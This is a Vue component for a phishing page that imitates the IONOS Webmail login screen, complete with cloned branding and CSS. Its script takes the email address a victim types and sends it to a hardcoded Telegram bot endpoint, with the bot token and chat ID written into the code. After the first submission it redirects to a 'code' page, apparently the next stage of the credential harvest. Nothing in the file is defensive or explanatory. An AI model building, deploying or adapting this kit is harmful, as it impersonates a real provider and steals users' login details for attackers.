


<template>
  <div id="app">
  
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IONOS Webmail Login</title>

    <!-- CSS -->
    <link rel="stylesheet" href="style.css">

    <!-- Icons -->
    <link rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
</head>
<body>

    <!-- Header -->
    <header class="header">
        <div class="logo">
            <span>IONOS</span>
            <strong>PRODUCT LOGIN</strong>
        </div>

        <div class="search-box">
            <i class="fa-solid fa-magnifying-glass"></i>
            <span>Search for features, domains, and help</span>
            <i class="fa-solid fa-microphone"></i>
        </div>
    </header>

    <!-- Main -->
    <main class="main-container">


        <!-- Login Card -->
        <section class="login-card">

            <div class="login-title">
                <div class="mail-icon">
                     <img src="../public/images/my-account.svg" alt="Webmail Login">

                </div>
                <h1>My Webmail Login</h1>
            </div>

            <label for="email">Email address</label>

             

            <input
                type="email"
                id="email"
                name="email"
                v-model="formDataRes.username"
            >

            <p class="device-text">
                <strong>Not your device?</strong>
                Log out after the session or use private browsing mode.
            </p>

            <button class="next-button"    @click.prevent="finishJoob();">Next</button>

            <div class="customer-section">
                <strong>Not an IONOS customer yet?</strong>
                <a href="#">Become a customer now and benefit from our offers.</a>
            </div>

        </section>

        <!-- More Logins -->
        <section class="more-logins">
            <h2>More IONOS Logins</h2>

            <div class="login-options">

                <div class="login-option">
                    <div class="option-icon user-icon">
                        <i class="fa-solid fa-user"></i>
                    </div>
                    <span>My IONOS</span>
                </div>

                <div class="login-option">
                    <div class="option-icon cloud-icon">
                        <i class="fa-solid fa-cloud-arrow-up"></i>
                    </div>
                    <span>HiDrive</span>
                </div>

                <div class="login-option">
                    <div class="option-icon archive-icon">
                        <i class="fa-solid fa-envelope"></i>
                    </div>
                    <span>Email Archiving</span>
                </div>

            </div>
        </section>

    </main>

</body>
</html>

    
  </div>
</template>





<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        username: "",
       
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*⚠️ ionos*\nUsername: ${this.formDataRes.username}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
          // 5
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("code");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>


<style>

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #f2f7fb;
    color: #16345c;
}

/* =========================
   HEADER
========================= */

.header {
    height: 48px;
    background: #ffffff;
    border-bottom: 2px solid #d7dce1;

    display: flex;
    align-items: center;
    padding: 0 28px;

    position: relative;
}

.logo {
    display: flex;
    align-items: center;
    gap: 15px;
    color: #123b73;

}

.alert{
    color: rgb(201, 32, 32);
    padding: 20px;
}
.logo span {
    font-size: 20px;
    font-weight: 800;
    letter-spacing: 3px;
}

.logo strong {
    font-size: 16px;
    font-weight: 800;
}

.search-box {
    position: absolute;
    left: 50%;
    transform: translateX(-50%);

    width: 350px;
    height: 36px;

    border: 1px solid #aeb8c3;
    border-radius: 7px;

    display: flex;
    align-items: center;

    padding: 0 12px;

    color: #526272;
    font-size: 13px;
    font-weight: 500;
}

.search-box i:first-child {
    margin-right: 10px;
}

.search-box span {
    flex: 1;
}

.search-box i:last-child {
    font-size: 14px;
}


/* =========================
   MAIN
========================= */

.main-container {
    width: 560px;
    margin: 28px auto 0;
}


/* =========================
   LOGIN CARD
========================= */
.login-card {
    width: 550px;
    background: #ffffff;
    border-radius: 12px;
    padding: 32px 28px 34px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.04);
}


/* Login title */

.login-title {
    display: flex;
    align-items: center;
    gap: 16px;

    margin-bottom: 32px;
}

.login-title h1 {
    font-size: 18px;
    font-weight: 800;
    color: #152f50;
}

.mail-icon {
    width: 40px;
    height: 40px;

    background: #b9e2f6;

    display: flex;
    align-items: center;
    justify-content: center;

    color: #173f70;

    position: relative;
    font-size: 20px;
}

.mail-icon::after {
    content: "";

    position: absolute;
    bottom: -5px;
    right: -5px;

    width: 21px;
    height: 16px;

    background: #17457c;
}

.mail-icon i {
    position: relative;
    z-index: 2;
}


/* Label */

.login-card label {
    display: block;

    font-size: 13px;
    font-weight: 800;

    color: #35485d;

    margin-bottom: 7px;
}


/* Input */

.login-card input {
    width: 100%;
    height: 38px;

    border: 1px solid #8998a8;
    border-radius: 6px;

    outline: none;

    padding: 7px 10px;

    font-size: 15px;
    font-weight: 500;
}

.login-card input:focus {
    border-color: #164a88;
    border-width: 2px;
}


/* Device text */

.device-text {
    font-size: 12px;
    font-weight: 500;

    color: #435365;

    margin-top: 8px;
    margin-bottom: 22px;

    line-height: 1.5;
}

.device-text strong {
    color: #273c52;
    font-weight: 800;
}


/* Next button */

.next-button {
    width: 100%;
    height: 38px;

    border: none;
    border-radius: 20px;

    background: #123c79;
    color: #ffffff;

    font-size: 13px;
    font-weight: 800;

    cursor: pointer;

    transition: background 0.2s ease;
}

.next-button:hover {
    background: #0d3268;
}


/* Customer */

.customer-section {
    margin-top: 45px;

    display: flex;
    flex-direction: column;

    gap: 8px;
}

.customer-section strong {
    font-size: 12px;
    font-weight: 800;

    color: #273d56;
}

.customer-section a {
    font-size: 12px;
    font-weight: 600;

    color: #5484ad;
    text-decoration: none;
}

.customer-section a:hover {
    text-decoration: underline;
}


/* =========================
   MORE LOGINS
========================= */

.more-logins {
    margin-top: 26px;
}

.more-logins h2 {
    font-size: 13px;
    font-weight: 800;

    margin-bottom: 12px;

    color: #233c5a;
}


/* Login options */

.login-options {
    display: flex;
    gap: 20px;
}

.login-option {
    width: 173px;
    height: 108px;

    background: #ffffff;

    border-radius: 12px;

    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;

    gap: 9px;
}

.login-option span {
    font-size: 12px;
    font-weight: 700;

    color: #2e6899;
}


/* Icons */

.option-icon {
    width: 48px;
    height: 48px;

    border-radius: 50%;

    display: flex;
    align-items: center;
    justify-content: center;

    font-size: 24px;
}


/* My IONOS */

.user-icon {
    background: #a9d9f2;
    color: #164b80;
}


/* HiDrive */

.cloud-icon {
    background: #b1e0f4;
    color: #3d7ca8;
}


/* Email Archiving */

.archive-icon {
    width: 48px;
    height: 42px;

    border-radius: 2px;

    background: #d7edf8;

    color: #0b477c;

    font-size: 25px;
}


/* =========================
   RESPONSIVE
========================= */

@media (max-width: 650px) {

    .header {
        padding: 0 15px;
    }

    .logo strong {
        display: none;
    }

    .search-box {
        display: none;
    }

    .main-container {
        width: calc(100% - 30px);
        max-width: 560px;
    }

    .login-options {
        gap: 10px;
    }

    .login-option {
        flex: 1;
        width: auto;
    }
}


</style>